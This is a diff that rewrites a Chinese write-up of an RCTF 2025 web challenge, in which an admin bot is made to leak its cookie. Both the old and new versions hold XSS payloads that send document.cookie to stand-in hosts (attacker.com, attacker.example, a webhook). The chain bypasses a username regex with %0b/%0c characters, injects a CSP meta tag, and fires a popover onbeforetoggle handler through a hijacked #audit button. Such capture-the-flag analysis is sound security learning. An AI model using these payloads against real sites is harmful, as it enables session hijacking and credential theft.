@@ -2,85 +2,72 @@
 
 ## 题目简述
 
-这一题仍围绕 author meta 注入，但 bot 会点击审核/拒绝按钮，且 username 过滤了常规空白与尖括号。解法利用浏览器解析差异中的 `%0b`、`%0c` 作为属性分隔，并借助 popover 的 `onbeforetoggle` 在 bot 操作时触发 XSS。
+Plus 版仍把用户名写入未加引号的 `<meta name="author" content=...>`，但修补了上一题的直接利用：注册正则禁止尖括号、引号、普通空格、`\t`、`\r`、`\n`，文章正文还会在服务端经过两次 DOMPurify。管理员 Bot 携带 flag cookie，进入文章后会查找并点击 `#audit`。解法组合了不同解析器对控制字符的处理差异、CSP meta 注入和 HTML Popover 的 `beforetoggle` 事件。
 
 ## 解题过程
 
-### 关键观察
+### 两个仍然可控的输入面
 
-这一题仍围绕 author meta 注入，但 bot 会点击审核/拒绝按钮，且 username 过滤了常规空白与尖括号。
+用户名过滤与模板如下：
 
-### 求解步骤
+```php
+if (preg_match('/[<>\'"\\x20\\t\\r\\n]/', $username)) {
+    die("invalid username");
+}
 
-bot点了两个按钮
 <meta name="author" content=<?php echo $pageAuthor; ?>>
-username='script-src-elem <http://blog-app/assets/js/article.js>' http-
-equiv=Content-Security-Policy
-<img src=x onerror="fetch('<http://webhook/?d=>' +
-encodeURI(document.cookie))">
-await page.goto(article_url, { timeout: 3000, waitUntil: 'domcontentloaded' })
+```
 
-        const auditBtn = await page.$('#audit');
-        if (auditBtn) {
-            await Promise.all([
-                auditBtn.click(),
-                page.waitForNavigation({ waitUntil: 'domcontentloaded' }),
-            ]);
-        }
+正则遗漏了垂直制表符 `\x0b` 和换页符 `\x0c`，而模板没有给 `content` 加引号。两种字符在不同语法层的作用不同：
 
-        let rejectBtn = null;
-        try {
-            rejectBtn = await page.waitForSelector('.btn-reject', { visible:
-true, timeout: 5000 });
-https://x.com/avlidienbrunn/status/1676549516785221635
-其实meta也可以用来放unsafe-inline类型的js
-a popover id=x onbeforetoggle=alert(1)
-当然我们依旧需要csp来限制xss-shield的破坏
-实际上这个过滤并不安全，我测试后使用了两种不同解析结果的空白符
-%0b 垂直方向制表符
-%0c 换页符
-来完成规则的编写和脚本的插入
-        } catch (err) {}
-        if (rejectBtn) {
-            await rejectBtn.click();
-        }
-<head>
-<meta name="author" content="a" popover id=x onbeforetoggle=alert(1) />
-</head>
-<body>
-<button id=audit popovertarget=x>Click me</button>
-<div popover id=x>actual popover</div>
-</body>
-preg_match('/[<>\\'"\\x20\\t\\r\\n]/', $username)
-username=script-src-elem%0bhttp://blog-app/assets/js/article.js%0chttp-
-equiv=Content-Security-
-Policy%0cpopover%0cid=x%0conbeforetoggle=location.href=`http://attacker.com:12
-34/?
-c=${encodeURI(document.cookie)}`&email=9@le0n.com&password=111111&confirm_pass
-word=111111&csrf_token=c4bb4bfbfbc051eb3ca51912cac3e6ea70b37cc092688fc5f8c313e
-611543d5f
+- Chromium 的 CSP 解析会把 `\x0b` 当作指令内的空白，因此它可以分隔 `script-src-elem` 与允许的 URL；HTML 属性解析不会在这里提前结束 `content`。
+- HTML 分词器把 `\x0c` 视作属性间空白，因此它可以把后续文本拆成 `http-equiv`、`popover`、`id` 和事件处理器等新属性。
 
-### 参考链接补充
+文章正文虽然由 DOMPurify 清洗，但普通 `<button>` 和 `popovertarget` 属性会保留。这正好提供一个不含脚本的交互触发器。
 
-外链推文对应的技术点是 HTML `popover` 事件触发 XSS。关键不是 `<script>` 标签本身，而是浏览器在解析属性时接受更多空白分隔符，并且 popover 被打开/关闭时会触发 `beforetoggle`：
+### 构造 meta popover
 
-- 题目正则只过滤了尖括号、引号、空格、`\t`、`\r`、`\n`，但没有覆盖垂直制表符 `%0b` 和换页符 `%0c`。这些字符在 HTML 属性解析中仍可作为分隔，从而把 `meta name=author content=...` 打散成额外属性。
-- bot 会点击审核按钮；页面中若存在 `popovertarget=x` 与 `popover id=x`，点击会触发对应 popover 的 `beforetoggle` 事件。
-- 因为站内还有 `xss-shield` 干扰，payload 先用 CSP meta 限制脚本来源/行为，再把外带逻辑放到 `onbeforetoggle`，由 bot 点击动作触发 cookie 回传。
+PDF 中的用户名 payload 可整理为下面的结构；实际提交时把换行删除，并将接收地址替换为自己的监听端点：
 
-因此本题的 payload 需要同时满足三件事：用非常规空白绕过 PHP 正则、用 CSP meta 压制防护脚本、用 popover 交互事件替代页面加载时执行。
+```text
+script-src-elem%0bhttp://blog-app/assets/js/article.js
+%0chttp-equiv=content-security-policy
+%0cpopover
+%0cid=x
+%0conbeforetoggle=location.href=`https://attacker.example/?c=${encodeURIComponent(document.cookie)}`
+```
 
-### PDF 图片
+浏览器解析后的关键部分近似为：
 
-![Flask 服务终端中打印 flag 的输出](RCTF2025-author-plus-wp/flask-flag-terminal-output.png)
+```html
+<meta name="author"
+      content="script-src-elem http://blog-app/assets/js/article.js"
+      http-equiv="content-security-policy"
+      popover
+      id="x"
+      onbeforetoggle="location.href=`https://attacker.example/?c=${encodeURIComponent(document.cookie)}`">
+```
 
-### PDF 外链
+CSP 阻止 `xss-shield.js`，同时用户名注入的 meta 元素本身成为一个带事件的 popover。
 
-- <https://x.com/avlidienbrunn/status/1676549516785221635>
-- <https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags>
+### 劫持 Bot 的点击
+
+发布文章时只需提交能够通过 DOMPurify 的按钮：
+
+```html
+<button id="audit" popovertarget="x">Audit</button>
+```
+
+这枚按钮出现在页面自带审核链接之前。Bot 的 `page.$('#audit')` 取得第一个匹配元素并点击，按钮尝试切换 `id=x` 的 popover，触发 meta 上的 `beforetoggle`，随后导航到监听端点并携带 cookie。PDF 中的监听日志显示 URL 编码后的验证值为：
+
+```text
+RCTF{7h3_pu15_v3r510n_15_ju57_50_50}
+```
+
+原 PDF 引用的推文只是技巧来源，且内容不够稳定，正文已完整保留其作用，因此不再保留；更完整的原理和兼容性背景可参阅 PortSwigger 的 [hidden input / meta 标签 XSS 研究](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)。该文章对本题的必要信息就是：不可聚焦的元素也能借 `popover` 与 `onbeforetoggle` 获得用户交互触发点，本文已经转写为具体利用链。
 
 ## 方法总结
 
-- 核心技巧：浏览器空白符解析差异、popover 事件触发 XSS。
-- 识别信号：正则只过滤常规空白和符号，但 HTML 属性解析接受更多分隔字符。
-- 复用要点：bot 会点击按钮时，可把 payload 绑定到交互事件而不是页面加载。
+- 核心技巧：利用 CSP 与 HTML 解析器对控制字符的不同处理，在 meta 上注入 popover 事件，再借 Bot 点击触发。
+- 识别信号：黑名单只列出常规空白；未加引号的属性值仍可控；Bot 会点击可预测选择器；净化器允许 popover 相关的无脚本标记。
+- 复用要点：分别验证 URL 解码、服务端正则、HTML 分词和 CSP 解析四个阶段，不要笼统地把 `%0b`、`%0c` 都称为“空格”；交互型 Bot 往往能提供比页面加载更稳定的事件触发点。
